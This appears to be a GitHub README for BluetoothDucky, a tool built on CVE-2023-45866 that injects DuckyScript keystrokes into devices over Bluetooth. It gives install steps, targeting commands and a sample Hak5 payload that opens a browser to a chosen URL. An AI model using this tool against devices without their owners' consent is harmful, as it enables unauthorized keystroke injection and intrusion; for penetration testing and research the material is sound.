# BluetoothDucky
CVE-2023-45866 - BluetoothDucky implementation (Using DuckyScript)

This is an implementation of the CVE discovered by marcnewlin 
[https://github.com/marcnewlin/hi_my_name_is_keyboard]

- I have created a ducky_convert.py to try not to modify the hid.py file as much as I can for future usage.
- Still working on a few payload ideas for it.

Should work in the future with any android related payload scripts such as the following from Hak5

  ```bash
   REM Title: Android Browse to URL Example
   REM Author: Hak5Darren
   REM Desscription: Opens browser. Navigates to URL.
   REM Target: "most" Android devices (compatibility varies by vendor implementation)
   REM DuckyScript: 3.0
   ATTACKMODE HID STORAGE
   WAIT_FOR_BUTTON_PRESS
   REM HID and STORAGE for convenience. Doesn't execute payload until button press.
   DEFINE URL hak5.org
   REM Change to URL of your choosing.
   GUI b
   REM Open browser
   DELAY 700
   CTRL l
   REM Select URL bar
   DELAY 700
   STRINGLN URL
   REM inject URL and press ENTER
  ```

- Just putting this code up for anyone wanting to help.

  Installation instructions (Stolen from marcnewlin)
```
# update apt
sudo apt-get update
sudo apt-get -y upgrade

# install dependencies from apt
sudo apt install -y bluez-tools bluez-hcidump libbluetooth-dev \
                    git gcc python3-pip python3-setuptools \
                    python3-pydbus

# install pybluez from source
git clone https://github.com/pybluez/pybluez.git
cd pybluez
sudo python3 setup.py install

# build bdaddr from the bluez source
cd ~/
git clone --depth=1 https://github.com/bluez/bluez.git
gcc -o bdaddr ~/bluez/tools/bdaddr.c ~/bluez/src/oui.c -I ~/bluez -lbluetooth
sudo cp bdaddr /usr/local/bin/
```

Then simply
```
git clone https://github.com/pentestfunctions/BluetoothDucky
cd BluetoothDucky
```

## Example Usage
```
sudo python3 BluetoothDucky.py -i hci0 -t 00:00:00:00:00:00
```
```
sudo python3 BluetoothDucky.py --scan
```

It will look for a payload.txt file in the same directory which can just be ducky script - try something simple provided in this repo to start.
